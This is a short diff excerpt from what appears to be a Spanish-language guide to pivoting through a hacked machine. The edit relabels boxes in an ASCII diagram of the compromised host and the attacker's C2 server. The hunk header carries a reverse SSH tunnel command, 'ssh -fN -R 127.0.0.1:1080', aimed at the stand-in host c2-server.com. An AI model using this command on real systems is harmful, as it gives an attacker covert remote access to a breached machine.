@@ -39,8 +39,8 @@ ssh -fN -R 127.0.0.1:1080 user@c2-server.com
 El C2 (c2-server.com) escuchará en 127.0.0.1:1080 y redirigirá el tráfico a tu máquina local.
 
 ┌─────────────────────────┐          ┌───────────────────────┐
-│                         │          │                       │
-│   Máquina Local         │          │   Servidor C2         │
+│                         │          │   Nuestro PC          │
+│   Máquina Local         │          │   Panel control C2    │
 │  (sistema hackeado)     │          │   (Atacante/Admin)    │
 │                         │          │                       │
 │  +------------------+   │          │   +----------------+  │
